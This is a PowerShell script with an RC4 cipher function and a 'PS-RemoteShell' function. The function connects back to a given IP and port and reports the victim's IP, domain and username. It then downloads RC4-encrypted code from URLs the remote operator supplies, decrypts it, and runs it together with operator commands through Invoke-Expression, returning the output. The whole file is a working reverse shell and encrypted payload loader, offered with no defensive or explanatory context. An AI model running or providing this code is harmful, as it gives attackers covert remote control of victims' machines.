function Crypto-RC4 {
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [Byte[]]
        $inputObject,

        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Byte[]]
        $key
    )

    BEGIN {
        [Byte[]] $S = 0..255
        $J = 0
        0..255 | ForEach-Object {
            $J = ($J + $S[$_] + $key[$_ % $key.Length]) % 256
            $S[$_], $S[$J] = $S[$J], $S[$_]
        }
        $I = $J = 0
    }

    PROCESS {
        ForEach($Byte in $inputObject) {
            $I = ($I + 1) % 256
            $J = ($J + $S[$I]) % 256
            $S[$I], $S[$J] = $S[$J], $S[$I]
            $Byte -bxor $S[($S[$I] + $S[$J]) % 256]
        }
    }
}

function PS-RemoteShell { 
	[CmdletBinding()]
	Param(
	[Parameter(Mandatory=$True)]
	[string]$ip,
	[Parameter(Mandatory=$True)]
	[int]$port,
	[Parameter(Mandatory=$True)]
	[string]$key
	)
   
	BEGIN {

	}

	PROCESS {
		$s = New-Object System.Net.Sockets.TCPClient($ip, $port);
		$stream = $s.GetStream();
		[byte[]]$bytes = 0..255|%{0}
		
		if( -not (Test-Path env:userdomain)) {
			$domain = $env:computername
		} else {
			$domain = $env:userdomain
		}
		
		$target = get-WmiObject Win32_NetworkAdapterConfiguration | Where {$_.Ipaddress.length -gt 1}
		$target = $target.ipaddress[0] 
		
		$promptUrl = ([text.encoding]::ASCII).GetBytes("(" + $target + ":" + $domain + "\" + $env:username + "):Url >")
		$stream.Write($promptUrl, 0, $promptUrl.Length)
		while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
			
			$received = New-Object -TypeName System.Text.ASCIIEncoding
			$url = $received.GetString($bytes,0, $i)
			$url = $url.Substring(0, $url.Length - 1)
			
			if($url.ToUpper() -ne "NULL") {
				$data = (New-Object Net.WebClient).DownloadData($url)
				$data = ($data | Crypto-RC4 -Key ([System.Text.Encoding]::ASCII.GetBytes($key)))
				$data = [System.Text.Encoding]::ASCII.GetString($data)
			} 
			
			$promptCmd = ([text.encoding]::ASCII).GetBytes("(" + $url + "):Exec >")
			$stream.Write($promptCmd, 0, $promptCmd.Length)
			$j = $stream.Read($bytes, 0, $bytes.Length)
			$received = New-Object -TypeName System.Text.ASCIIEncoding
			$cmd = $received.GetString($bytes,0, $j)
			
			$cmd = $data + ";" + $cmd
			$exec = (Invoke-Expression -Command $cmd 2>&1 | Out-String )
			$data = "GARBAGE"
			$exec  = $exec + "`n"
			$sendbyte = ([text.encoding]::ASCII).GetBytes($exec) + $promptUrl
			$stream.Write($sendbyte,0,$sendbyte.Length)
			$stream.Flush()  
		}
		$s.Close()
	}
   
   END {
   
   }
}
